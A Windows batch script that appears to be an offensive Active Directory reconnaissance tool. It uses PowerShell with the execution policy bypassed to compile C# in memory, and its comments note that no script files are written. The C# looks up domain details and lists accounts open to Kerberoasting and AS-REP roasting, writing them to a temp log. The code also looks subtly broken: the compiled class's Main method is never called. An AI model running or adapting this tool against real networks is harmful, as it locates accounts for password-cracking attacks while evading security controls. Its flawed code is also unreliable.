@echo off
setlocal enabledelayedexpansion

REM ===============================================
REM run_inline_dotnet.bat - .NET inline via PowerShell Add-Type
REM Bypass: PowerShell running with .NET compile-in-memory
REM No script files written.
REM ===============================================

set "OUT=%TEMP%"

echo === AD RECON via inline .NET ===

REM PowerShell -Command with embedded C# code compiled in-memory
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Add-Type -TypeDefinition 'using System;using System.DirectoryServices;using System.DirectoryServices.ActiveDirectory;using System.Linq;public class R{public static void Main(string[] a){var d=Domain.GetCurrentDomain();System.IO.File.WriteAllText(System.IO.Path.GetTempPath()+\"ad_dotnet.log\",string.Format(\"Domain:{0}\\nPDC:{1}\\nSID:{2}\\n\",d.Name,d.PdcRoleOwner,d.DomainSid));var s=new DirectorySearcher();s.Filter=\"(&(objectCategory=user)(servicePrincipalName=*))\";s.PageSize=1000;var spn=\"\";foreach(SearchResult r in s.FindAll()){var u=r.GetDirectoryEntry();spn+=u.Properties[\"samaccountname\"][0]+\" -> \"+(u.Properties[\"servicePrincipalname\"][0]??\"\")+\"\\n\";}System.IO.File.AppendAllText(System.IO.Path.GetTempPath()+\"ad_dotnet.log\",\"\\n[KERBEROASTABLE]\\n\"+spn);s.Filter=\"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\";var asrep=\"\";foreach(SearchResult r in s.FindAll()){asrep+=r.Properties[\"samaccountname\"][0]+\"\\n\";}System.IO.File.AppendAllText(System.IO.Path.GetTempPath()+\"ad_dotnet.log\",\"\\n[AS-REP ROASTABLE]\\n\"+asrep);}}' -ErrorAction Stop"

if exist "%OUT%\ad_dotnet.log" (
    type "%OUT%\ad_dotnet.log"
) else (
    echo [ERROR] .NET inline didn't produce output
)
pause
endlocal
